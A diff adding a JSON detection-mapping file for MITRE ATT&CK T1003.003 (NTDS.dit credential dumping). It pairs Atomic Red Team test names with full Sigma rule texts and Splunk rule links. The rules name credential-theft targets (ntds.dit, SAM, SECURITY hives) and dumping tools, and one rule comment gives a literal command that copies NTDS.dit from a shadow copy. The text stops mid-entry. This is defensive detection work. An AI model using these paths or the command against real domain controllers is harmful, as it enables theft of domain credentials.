@@ -1,0 +1,764 @@
+{
+    "id": "T1003.003",
+    "name": "NTDS",
+    "description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in `%SystemRoot%NTDSNtds.dit` of a domain controller.(Citation: Wikipedia Active Directory)\nIn addition to looking for NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy",
+    "platforms": "Windows",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "File: File Access, Command: Command Execution",
+    "detection": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.",
+    "url": "https://attack.mitre.org/techniques/T1003/003",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1003.003",
+                "atomic_attack_guid": "b385996c-0e7d-4e27-95a4-aca046b119a7",
+                "atomic_attack_name": "Create Volume Shadow Copy with diskshadow",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Diskshadow Script Mode Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_diskshadow_script_mode.yml",
+                        "remote_content": "title: Diskshadow Script Mode Execution\nid: 0c2f8629-7129-4a8a-9897-7e0768f13ff2\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 1dde5376-a648-492e-9e54-4241dd9b0c7f # Diskshadow Script Mode - Uncommon Script Extension Execution\n      type: similar\n    - id: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8 # Potentially Suspicious Child Process Of DiskShadow.EXE\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\nstatus: test\ndescription: |\n    Detects execution of \"Diskshadow.exe\" in script mode using the \"/s\" flag. Attackers often abuse \"diskshadow\" to execute scripts that deleted the shadow copies on the systems. Investigate the content of the scripts and its location.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\nauthor: Ivan Dyachkov, oscd.community\ndate: 2020-10-07\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.execution\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'diskshadow.exe'\n        - Image|endswith: '\\diskshadow.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-s '\n    condition: all of selection_*\nfalsepositives:\n    - Likely from legitimate backup scripts\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "File And SubFolder Enumeration Via Dir Command",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_dir_execution.yml",
+                        "remote_content": "title: File And SubFolder Enumeration Via Dir Command\nid: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006\nstatus: test\ndescription: |\n    Detects usage of the \"dir\" command part of Widows CMD with the \"/S\" command line flag in order to enumerate files in a specified directory and all subdirectories.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2024-04-14\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: Cmd.Exe\n    selection_cli:\n        CommandLine|contains|windash: 'dir*-s'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Password Managers Discovery",
+                        "rule_link": "https://research.splunk.com/endpoint/a3b3bc96-1c4f-4eba-8218-027cac739a48/"
+                    },
+                    {
+                        "rule_name": "Windows Diskshadow Proxy Execution",
+                        "rule_link": "https://research.splunk.com/endpoint/58adae9e-8ea3-11ec-90f6-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.003",
+                "atomic_attack_guid": "21748c28-2793-4284-9e07-d6d028b66702",
+                "atomic_attack_name": "Create Symlink to Volume Shadow Copy",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "VolumeShadowCopy Symlink Creation Via Mklink",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_mklink_shadow_copies_access_symlink.yml",
+                        "remote_content": "title: VolumeShadowCopy Symlink Creation Via Mklink\nid: 40b19fa6-d835-400c-b301-41f3a2baacaf\nstatus: stable\ndescription: Shadow Copies storage symbolic link creation using operating systems utilities\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019-10-22\nmodified: 2023-03-06\ntags:\n    - attack.credential-access\n    - attack.t1003.002\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'mklink'\n            - 'HarddiskVolumeShadowCopy'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Sensitive File Access Via Volume Shadow Copy Backup",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_sensitive_file_access_shadowcopy.yml",
+                        "remote_content": "title: Sensitive File Access Via Volume Shadow Copy Backup\nid: f57f8d16-1f39-4dcb-a604-6c73d9b54b3d\nstatus: test\ndescription: |\n    Detects a command that accesses the VolumeShadowCopy in order to extract sensitive files such as the Security or SAM registry hives or the AD database (ntds.dit)\nreferences:\n    - https://twitter.com/vxunderground/status/1423336151860002816?s=20\n    - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection\n    - https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/\nauthor: Max Altgelt (Nextron Systems), Tobias Michalski (Nextron Systems)\ndate: 2021-08-09\nmodified: 2024-01-18\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        # copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit 2>&1\n        # There is an additional \"\\\" to escape the special \"?\"\n        CommandLine|contains: '\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy'\n    selection_2:\n        CommandLine|contains:\n            - '\\\\NTDS.dit'\n            - '\\\\SYSTEM'\n            - '\\\\SECURITY'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Credential Dumping via Symlink to Shadow Copy",
+                        "rule_link": "https://research.splunk.com/endpoint/c5eac648-fae0-4263-91a6-773df1f4c903/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.003",
+                "atomic_attack_guid": "21c7bf80-3e8b-40fa-8f9d-f5b194ff2865",
+                "atomic_attack_name": "Create Volume Shadow Copy remotely (WMI) with esentutl",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Copying Sensitive Files with Credential Data",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_esentutl_sensitive_file_copy.yml",
+                        "remote_content": "title: Copying Sensitive Files with Credential Data\nid: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f\nstatus: test\ndescription: Files with well-known filenames (sensitive files with credential data) copying\nreferences:\n    - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/2cc01b01132b5c304027a658c698ae09dd6a92bf/yml/OSBinaries/Esentutl.yml\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-22\nmodified: 2024-06-04\ntags:\n    - attack.credential-access\n    - attack.t1003.002\n    - attack.t1003.003\n    - car.2013-07-001\n    - attack.s0404\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_esent_img:\n        - Image|endswith: '\\esentutl.exe'\n        - OriginalFileName: '\\esentutl.exe'\n    selection_esent_cli:\n        CommandLine|contains|windash:\n            - 'vss'\n            - ' /m '\n            - ' /y '\n    selection_susp_paths:\n        CommandLine|contains:\n            - '\\config\\RegBack\\sam'\n            - '\\config\\RegBack\\security'\n            - '\\config\\RegBack\\system'\n            - '\\config\\sam'\n            - '\\config\\security'\n            - '\\config\\system '        # space needed to avoid false positives with \\config\\systemprofile\\\n            - '\\repair\\sam'\n            - '\\repair\\security'\n            - '\\repair\\system'\n            - '\\windows\\ntds\\ntds.dit'\n    condition: all of selection_esent_* or selection_susp_paths\nfalsepositives:\n    - Copying sensitive files for legitimate use (eg. backup) or forensic investigation by legitimate incident responder or forensic investigator.\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Process Created Via Wmic.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_susp_process_creation.yml",
+                        "remote_content": "title: Suspicious Process Created Via Wmic.EXE\nid: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8\nrelated:\n    - id: 526be59f-a573-4eea-b5f7-f0973207634d # Generic\n      type: derived\nstatus: test\ndescription: Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.\nreferences:\n    - https://thedfirreport.com/2020/10/08/ryuks-return/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-12\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'process '\n            - 'call '\n            - 'create '\n        CommandLine|contains:\n            # Add more susupicious paths and binaries as you see fit in your env\n            - 'rundll32'\n            - 'bitsadmin'\n            - 'regsvr32'\n            - 'cmd.exe /c '\n            - 'cmd.exe /k '\n            - 'cmd.exe /r '\n            - 'cmd /c '\n            - 'cmd /k '\n            - 'cmd /r '\n            - 'powershell'\n            - 'pwsh'\n            - 'certutil'\n            - 'cscript'\n            - 'wscript'\n            - 'mshta'\n            - '\\Users\\Public\\'\n            - '\\Windows\\Temp\\'\n            - '\\AppData\\Local\\'\n            - '%temp%'\n            - '%tmp%'\n            - '%ProgramData%'\n            - '%appdata%'\n            - '%comspec%'\n            - '%localappdata%'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "New Process Created Via Wmic.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_process_creation.yml",
+                        "remote_content": "title: New Process Created Via Wmic.EXE\nid: 526be59f-a573-4eea-b5f7-f0973207634d\nrelated:\n    - id: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8 # For suspicious process creation\n      type: derived\nstatus: test\ndescription: Detects new process creation using WMIC via the \"process call create\" flag\nreferences:\n    - https://www.sans.org/blog/wmic-for-incident-response/\n    - https://github.com/redcanaryco/atomic-red-team/blob/84215139ee5127f8e3a117e063b604812bd71928/atomics/T1047/T1047.md#atomic-test-5---wmi-execute-local-process\nauthor: Michael Haag, Florian Roth (Nextron Systems), juju4, oscd.community\ndate: 2019-01-16\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'process'\n            - 'call'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "WMIC Remote Command Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_remote_execution.yml",
+                        "remote_content": "title: WMIC Remote Command Execution\nid: 7773b877-5abb-4a3e-b9c9-fd0369b59b00\nrelated:\n    - id: e42af9df-d90b-4306-b7fb-05c863847ebd\n      type: obsolete\n    - id: 09af397b-c5eb-4811-b2bb-08b3de464ebf\n      type: obsolete\nstatus: test\ndescription: Detects the execution of WMIC to query information on a remote system\nreferences:\n    - https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: '/node:'\n    filter_localhost:\n        CommandLine|contains:\n            - '/node:127.0.0.1 '\n            - '/node:localhost '\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Remote WMI Command Attempt",
+                        "rule_link": "https://research.splunk.com/endpoint/272df6de-61f1-4784-877c-1fbc3e2d0838/"
+                    },
+                    {
+                        "rule_name": "Credential Dumping via Copy Command from Shadow Copy",
+                        "rule_link": "https://research.splunk.com/endpoint/d8c406fe-23d2-45f3-a983-1abe7b83ff3b/"
+                    },
+                    {
+                        "rule_name": "Windows WMI Process Call Create",
+                        "rule_link": "https://research.splunk.com/endpoint/0661c2de-93de-11ec-9833-acde48001122/"
+                    },
+                    {
+                        "rule_name": "Remote Process Instantiation via WMI",
+                        "rule_link": "https://research.splunk.com/endpoint/d25d2c3d-d9d8-40ec-8fdf-e86fe155a3da/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.003",
+                "atomic_attack_guid": "d893459f-71f0-484d-9808-ec83b2b64226",
+                "atomic_attack_name": "Create Volume Shadow Copy remotely with WMI",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Shadow Copies Creation Using Operating Systems Utilities",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_creation.yml",
+                        "remote_content": "title: Shadow Copies Creation Using Operating Systems Utilities\nid: b17ea6f7-6e90-447e-a799-e6c0a493d6ce\nstatus: test\ndescription: Shadow Copies creation using operating systems utilities, possible credential access\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-22\nmodified: 2022-11-10\ntags:\n    - attack.credential-access\n    - attack.t1003\n    - attack.t1003.002\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n              - '\\wmic.exe'\n              - '\\vssadmin.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n              - 'wmic.exe'\n              - 'VSSADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'shadow'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "System Disk And Volume Reconnaissance Via Wmic.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_recon_volume.yml",
+                        "remote_content": "title: System Disk And Volume Reconnaissance Via Wmic.EXE\nid: c79da740-5030-45ec-a2e0-479e824a562c\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to discover information about the system, such as the volume name, size,\n    free space, and other disk information. This can be done using the `wmic` command-line utility and has been\n    observed being used by threat actors such as Volt Typhoon.\nreferences:\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: Stephen Lincoln `@slincoln-aiq`(AttackIQ)\ndate: 2024-02-02\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1047\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'volume'\n            - 'path win32_logicaldisk'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "WMIC Remote Command Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_remote_execution.yml",
+                        "remote_content": "title: WMIC Remote Command Execution\nid: 7773b877-5abb-4a3e-b9c9-fd0369b59b00\nrelated:\n    - id: e42af9df-d90b-4306-b7fb-05c863847ebd\n      type: obsolete\n    - id: 09af397b-c5eb-4811-b2bb-08b3de464ebf\n      type: obsolete\nstatus: test\ndescription: Detects the execution of WMIC to query information on a remote system\nreferences:\n    - https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: '/node:'\n    filter_localhost:\n        CommandLine|contains:\n            - '/node:127.0.0.1 '\n            - '/node:localhost '\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Remote WMI Command Attempt",
+                        "rule_link": "https://research.splunk.com/endpoint/272df6de-61f1-4784-877c-1fbc3e2d0838/"
+                    },
+                    {
+                        "rule_name": "Creation of Shadow Copy",
+                        "rule_link": "https://research.splunk.com/endpoint/eb120f5f-b879-4a63-97c1-93352b5df844/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.003",
+                "atomic_attack_guid": "224f7de0-8f0a-4a94-b5d8-989b036c86da",
+                "atomic_attack_name": "Create Volume Shadow Copy with WMI",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Shadow Copies Creation Using Operating Systems Utilities",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_creation.yml",
+                        "remote_content": "title: Shadow Copies Creation Using Operating Systems Utilities\nid: b17ea6f7-6e90-447e-a799-e6c0a493d6ce\nstatus: test\ndescription: Shadow Copies creation using operating systems utilities, possible credential access\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-22\nmodified: 2022-11-10\ntags:\n    - attack.credential-access\n    - attack.t1003\n    - attack.t1003.002\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n              - '\\wmic.exe'\n              - '\\vssadmin.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n              - 'wmic.exe'\n              - 'VSSADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'shadow'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "System Disk And Volume Reconnaissance Via Wmic.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_recon_volume.yml",
+                        "remote_content": "title: System Disk And Volume Reconnaissance Via Wmic.EXE\nid: c79da740-5030-45ec-a2e0-479e824a562c\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to discover information about the system, such as the volume name, size,\n    free space, and other disk information. This can be done using the `wmic` command-line utility and has been\n    observed being used by threat actors such as Volt Typhoon.\nreferences:\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: Stephen Lincoln `@slincoln-aiq`(AttackIQ)\ndate: 2024-02-02\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1047\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'volume'\n            - 'path win32_logicaldisk'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Creation of Shadow Copy",
+                        "rule_link": "https://research.splunk.com/endpoint/eb120f5f-b879-4a63-97c1-93352b5df844/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.003",
+                "atomic_attack_guid": "c6237146-9ea6-4711-85c9-c56d263a6b03",
+                "atomic_attack_name": "Copy NTDS.dit from Volume Shadow Copy",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Copying Sensitive Files with Credential Data",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_esentutl_sensitive_file_copy.yml",
+                        "remote_content": "title: Copying Sensitive Files with Credential Data\nid: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f\nstatus: test\ndescription: Files with well-known filenames (sensitive files with credential data) copying\nreferences:\n    - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/2cc01b01132b5c304027a658c698ae09dd6a92bf/yml/OSBinaries/Esentutl.yml\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-22\nmodified: 2024-06-04\ntags:\n    - attack.credential-access\n    - attack.t1003.002\n    - attack.t1003.003\n    - car.2013-07-001\n    - attack.s0404\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_esent_img:\n        - Image|endswith: '\\esentutl.exe'\n        - OriginalFileName: '\\esentutl.exe'\n    selection_esent_cli:\n        CommandLine|contains|windash:\n            - 'vss'\n            - ' /m '\n            - ' /y '\n    selection_susp_paths:\n        CommandLine|contains:\n            - '\\config\\RegBack\\sam'\n            - '\\config\\RegBack\\security'\n            - '\\config\\RegBack\\system'\n            - '\\config\\sam'\n            - '\\config\\security'\n            - '\\config\\system '        # space needed to avoid false positives with \\config\\systemprofile\\\n            - '\\repair\\sam'\n            - '\\repair\\security'\n            - '\\repair\\system'\n            - '\\windows\\ntds\\ntds.dit'\n    condition: all of selection_esent_* or selection_susp_paths\nfalsepositives:\n    - Copying sensitive files for legitimate use (eg. backup) or forensic investigation by legitimate incident responder or forensic investigator.\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Sensitive File Access Via Volume Shadow Copy Backup",
